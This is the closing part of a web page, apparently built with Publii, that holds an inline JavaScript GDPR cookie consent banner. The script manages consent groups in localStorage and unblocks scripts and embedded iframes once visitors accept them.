.05.04.09.1.11.16.03.06.04.12.04.19 0 .13-.05.26-.15.35-.09.1-.22.15-.35.15s-.26-.05-.35-.15a.355.355 0 0 1-.11-.16.433.433 0 0 1-.04-.19c0-.13.05-.26.15-.35Zm-4.93-1.86a.75.75 0 1 1 1.059-1.06.75.75 0 0 1-1.059 1.06Z"/></svg></button></div><script>(function(win) {
    if (!document.querySelector('.pcb')) {
        return;
    }

    var cbConfig = {
        behaviour: document.querySelector('.pcb').getAttribute('data-behaviour'),
        behaviourLink: document.querySelector('.pcb').getAttribute('data-behaviour-link'),
        revision: document.querySelector('.pcb').getAttribute('data-revision'),
        configTTL: parseInt(document.querySelector('.pcb').getAttribute('data-config-ttl'), 10),
        debugMode: document.querySelector('.pcb').getAttribute('data-debug-mode') === 'true',
        initialState: null,
        previouslyAccepted: []
    };

    var cbUI = {
        wrapper: document.querySelector('.pcb'),
        banner: {
            element: null,
            btnAccept: null,
            btnReject: null,
            btnConfigure: null
        },
        popup: {
            element: null,
            btnClose: null,
            btnSave: null,
            btnAccept: null,
            btnReject: null,
            checkboxes: null,
        },
        overlay: null,
        badge: null,
        blockedScripts: document.querySelectorAll('script[type^="gdpr-blocker/"]'),
        triggerLinks: cbConfig.behaviourLink ? document.querySelectorAll('a[href*="' + cbConfig.behaviourLink + '"]') : null
    };

    function initUI () {
        // setup banner elements
        cbUI.banner.element = cbUI.wrapper.querySelector('.pcb__banner');
        cbUI.banner.btnAccept = cbUI.banner.element.querySelector('.pcb__btn--accept');
        cbUI.banner.btnReject = cbUI.banner.element.querySelector('.pcb__btn--reject');
        cbUI.banner.btnConfigure = cbUI.banner.element.querySelector('.pcb__btn--configure');

        // setup popup elements
        if (cbUI.wrapper.querySelector('.pcb__popup')) {
            cbUI.popup.element = cbUI.wrapper.querySelector('.pcb__popup');
            cbUI.popup.btnClose = cbUI.wrapper.querySelector('.pcb__popup__close');
            cbUI.popup.btnSave = cbUI.popup.element.querySelector('.pcb__btn--save');
            cbUI.popup.btnAccept = cbUI.popup.element.querySelector('.pcb__btn--accept');
            cbUI.popup.btnReject = cbUI.popup.element.querySelector('.pcb__btn--reject');
            cbUI.popup.checkboxes = cbUI.popup.element.querySelector('input[type="checkbox"]');
            // setup overlay
            cbUI.overlay = cbUI.wrapper.querySelector('.pcb__overlay');
        }

        cbUI.badge = cbUI.wrapper.querySelector('.pcb__badge');

        if (cbConfig.behaviour.indexOf('link') > -1) {
            for (var i = 0; i < cbUI.triggerLinks.length; i++) {
                cbUI.triggerLinks[i].addEventListener('click', function(e) {
                    e.preventDefault();
                    showBannerOrPopup();
                });
            }
        }
    }

    function initState () {
        var lsKeyName = getConfigName();
        var currentConfig = localStorage.getItem(lsKeyName);
        var configIsFresh = checkIfConfigIsFresh();

        if (!configIsFresh || currentConfig === null) {
            if (cbConfig.debugMode) {
                console.log('🍪 Config not found, or configuration expired');
            }

            showBanner();
        } else if (typeof currentConfig === 'string') {
            if (cbConfig.debugMode) {
                console.log('🍪 Config founded');
            }

            showBadge();

            if (cbUI.popup.element) {
                var allowedGroups = currentConfig.split(',');
                var checkedCheckboxes = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');

                for (var j = 0; j < checkedCheckboxes.length; j++) {
                    var name = checkedCheckboxes[j].getAttribute('data-group-name');

                    if (name && name !== '-' && allowedGroups.indexOf(name) === -1) {
                        checkedCheckboxes[j].checked = false;
                    }
                }

                for (var i = 0; i < allowedGroups.length; i++) {
                    var checkbox = cbUI.popup.element.querySelector('input[type="checkbox"][data-group-name="' + allowedGroups[i] + '"]');

                    if (checkbox) {
                        checkbox.checked = true;
                    }

                    allowCookieGroup(allowedGroups[i]);
                }
            }
        }

        setTimeout(function () {
            cbConfig.initialState = getInitialStateOfConsents();
        }, 0);
    }

    function checkIfConfigIsFresh () {
        var lastConfigSave = localStorage.getItem('publii-gdpr-cookies-config-save-date');

        if (lastConfigSave === null) {
            return false;
        }

        lastConfigSave = parseInt(lastConfigSave, 10);

        if (lastConfigSave === 0) {
            return true;
        }

        if (+new Date() - lastConfigSave < cbConfig.configTTL * 24 * 60 * 60 * 1000) {
            return true;
        }

        return false;
    }

    function initBannerEvents () {
        cbUI.banner.btnAccept.addEventListener('click', function (e) {
            e.preventDefault();
            acceptAllCookies('banner');
            showBadge();
        }, false);

        if (cbUI.banner.btnReject) {
            cbUI.banner.btnReject.addEventListener('click', function (e) {
                e.preventDefault();
                rejectAllCookies();
                showBadge();
            }, false);
        }

        if (cbUI.banner.btnConfigure) {
            cbUI.banner.btnConfigure.addEventListener('click', function (e) {
                e.preventDefault();
                hideBanner();
                showAdvancedPopup();
                showBadge();
            }, false);
        }
    }

    function initPopupEvents () {
        if (!cbUI.popup.element) {
            return;
        }

        cbUI.overlay.addEventListener('click', function (e) {
            hideAdvancedPopup();
        }, false);

        cbUI.popup.element.addEventListener('click', function (e) {
            e.stopPropagation();
        }, false);

        cbUI.popup.btnAccept.addEventListener('click', function (e) {
            e.preventDefault();
            acceptAllCookies('popup');
        }, false);

        cbUI.popup.btnReject.addEventListener('click', function (e) {
            e.preventDefault();
            rejectAllCookies();
        }, false);

        cbUI.popup.btnSave.addEventListener('click', function (e) {
            e.preventDefault();
            saveConfiguration();
        }, false);

        cbUI.popup.btnClose.addEventListener('click', function (e) {
            e.preventDefault();
            hideAdvancedPopup();
        }, false);
    }

    function initBadgeEvents () {
        if (!cbUI.badge) {
            return;
        }

        cbUI.badge.addEventListener('click', function (e) {
            showBannerOrPopup();
        }, false);
    }

    initUI();
    initState();
    initBannerEvents();
    initPopupEvents();
    initBadgeEvents();

    /**
     * API
     */
    function addScript (src, inline) {
        var newScript = document.createElement('script');

        if (src) {
            newScript.setAttribute('src', src);
        }

        if (inline) {
            newScript.text = inline;
        }

        document.body.appendChild(newScript);
    }

    function allowCookieGroup (allowedGroup) {
        var scripts = document.querySelectorAll('script[type="gdpr-blocker/' + allowedGroup + '"]');
        cbConfig.previouslyAccepted.push(allowedGroup);
    
        for (var j = 0; j < scripts.length; j++) {
            addScript(scripts[j].src, scripts[j].text);
        }

        var groupEvent = new Event('publii-cookie-banner-unblock-' + allowedGroup);
        document.body.dispatchEvent(groupEvent);
        unlockEmbeds(allowedGroup);

        if (cbConfig.debugMode) {
            console.log('🍪 Allowed group: ' + allowedGroup);
        }
    }

    function showBannerOrPopup () {
        if (cbUI.popup.element) {
            showAdvancedPopup();
        } else {
            showBanner();
        }
    }

    function showAdvancedPopup () {
        cbUI.popup.element.classList.add('is-visible');
        cbUI.overlay.classList.add('is-visible');
        cbUI.popup.element.setAttribute('aria-hidden', 'false');
        cbUI.overlay.setAttribute('aria-hidden', 'false');
    }

    function hideAdvancedPopup () {
        cbUI.popup.element.classList.remove('is-visible');
        cbUI.overlay.classList.remove('is-visible');
        cbUI.popup.element.setAttribute('aria-hidden', 'true');
        cbUI.overlay.setAttribute('aria-hidden', 'true');
    }

    function showBanner () {
        cbUI.banner.element.classList.add('is-visible');
        cbUI.banner.element.setAttribute('aria-hidden', 'false');
    }

    function hideBanner () {
        cbUI.banner.element.classList.remove('is-visible');
        cbUI.banner.element.setAttribute('aria-hidden', 'true');
    }

    function showBadge () {
        if (!cbUI.badge) {
            return;
        }

        cbUI.badge.classList.add('is-visible');
        cbUI.badge.setAttribute('aria-hidden', 'false');
    }

    function getConfigName () {
        var lsKeyName = 'publii-gdpr-allowed-cookies';

        if (cbConfig.revision) {
            lsKeyName = lsKeyName + '-v' + parseInt(cbConfig.revision, 10);
        }

        return lsKeyName;
    }

    function storeConfiguration (allowedGroups) {
        var lsKeyName = getConfigName();
        var dataToStore = allowedGroups.join(',');
        localStorage.setItem(lsKeyName, dataToStore);

        if (cbConfig.configTTL === 0) {
            localStorage.setItem('publii-gdpr-cookies-config-save-date', 0);

            if (cbConfig.debugMode) {
                console.log('🍪 Store never expiring configuration');
            }
        } else {
            localStorage.setItem('publii-gdpr-cookies-config-save-date', +new Date());
        }
    }

    function getInitialStateOfConsents () {
        if (!cbUI.popup.element) {
            return [];
        }

        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');
        var groups = [];

        for (var i = 0; i < checkedGroups.length; i++) {
            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');

            if (allowedGroup !== '') {
                groups.push(allowedGroup);
            }
        }

        if (cbConfig.debugMode) {
            console.log('🍪 Initial state: ' + groups.join(', '));
        }

        return groups;
    }

    function getCurrentStateOfConsents () {
        if (!cbUI.popup.element) {
            return [];
        }

        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');
        var groups = [];

        for (var i = 0; i < checkedGroups.length; i++) {
            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');

            if (allowedGroup !== '') {
                groups.push(allowedGroup);
            }
        }

        if (cbConfig.debugMode) {
            console.log('🍪 State to save: ' + groups.join(', '));
        }

        return groups;
    }

    function getAllGroups () {
        if (!cbUI.popup.element) {
            return [];
        }

        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]');
        var groups = [];

        for (var i = 0; i < checkedGroups.length; i++) {
            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');

            if (allowedGroup !== '') {
                groups.push(allowedGroup);
            }
        }

        return groups;
    }

    function acceptAllCookies (source) {
        var groupsToAccept = getAllGroups();
        storeConfiguration(groupsToAccept);

        for (var i = 0; i < groupsToAccept.length; i++) {
            var group = groupsToAccept[i];

            if (cbConfig.initialState.indexOf(group) > -1 || cbConfig.previouslyAccepted.indexOf(group) > -1) {
                if (cbConfig.debugMode) {
                    console.log('🍪 Skip previously activated group: ' + group);
                }

                continue;
            }

            allowCookieGroup(group);
        }

        if (cbUI.popup.element) {
            var checkboxesToCheck = cbUI.popup.element.querySelectorAll('input[type="checkbox"]');

            for (var j = 0; j < checkboxesToCheck.length; j++) {
                checkboxesToCheck[j].checked = true;
            }
        }

        if (cbConfig.debugMode) {
            console.log('🍪 Accept all cookies: ', groupsToAccept.join(', '));
        }

        if (source === 'popup') {
            hideAdvancedPopup();
        } else if (source === 'banner') {
            hideBanner();
        }
    }

    function rejectAllCookies () {
        if (cbConfig.debugMode) {
            console.log('🍪 Reject all cookies');
        }

        storeConfiguration([]);
        setTimeout(function () {
            window.location.reload();
        }, 100);
    }

    function saveConfiguration () {
        var groupsToAccept = getCurrentStateOfConsents();
        storeConfiguration(groupsToAccept);

        if (cbConfig.debugMode) {
            console.log('🍪 Save new config: ', groupsToAccept.join(', '));
        }

        if (reloadIsNeeded(groupsToAccept)) {
            setTimeout(function () {
                window.location.reload();
            }, 100);
            return;
        }

        for (var i = 0; i < groupsToAccept.length; i++) {
            var group = groupsToAccept[i];

            if (cbConfig.initialState.indexOf(group) > -1 || cbConfig.previouslyAccepted.indexOf(group) > -1) {
                if (cbConfig.debugMode) {
                    console.log('🍪 Skip previously activated group: ' + group);
                }

                continue;
            }

            allowCookieGroup(group);
        }

        hideAdvancedPopup();
    }

    function reloadIsNeeded (groupsToAccept) {
        // check if user rejected consent for initial groups
        var initialGroups = cbConfig.initialState;
        var previouslyAcceptedGroups = cbConfig.previouslyAccepted;
        var groupsToCheck = initialGroups.concat(previouslyAcceptedGroups);

        for (var i = 0; i < groupsToCheck.length; i++) {
            var groupToCheck = groupsToCheck[i];

            if (groupsToAccept.indexOf(groupToCheck) === -1) {
                if (cbConfig.debugMode) {
                    console.log('🍪 Reload is needed due lack of: ', groupToCheck);
                }

                return true;
            }
        }

        return false;
    }

    function unlockEmbeds (cookieGroup) {
        var iframesToUnlock = document.querySelectorAll('.pec-wrapper[data-consent-group-id="' + cookieGroup + '"]');

        for (var i = 0; i < iframesToUnlock.length; i++) {
            var iframeWrapper = iframesToUnlock[i];
            iframeWrapper.querySelector('.pec-overlay').classList.remove('is-active');
            iframeWrapper.querySelector('.pec-overlay').setAttribute('aria-hidden', 'true');
            var iframe = iframeWrapper.querySelector('iframe');
            iframe.setAttribute('src', iframe.getAttribute('data-consent-src'));
        }
    }

    win.publiiEmbedConsentGiven = function (cookieGroup) {
        // it will unlock embeds
        allowCookieGroup(cookieGroup);

        var checkbox = cbUI.popup.element.querySelector('input[type="checkbox"][data-group-name="' + cookieGroup + '"]');

        if (checkbox) {
            checkbox.checked = true;
        }

        var groupsToAccept = getCurrentStateOfConsents();
        storeConfiguration(groupsToAccept);

        if (cbConfig.debugMode) {
            console.log('🍪 Save new config: ', groupsToAccept.join(', '));
        }
    }
})(window);</script></body></html>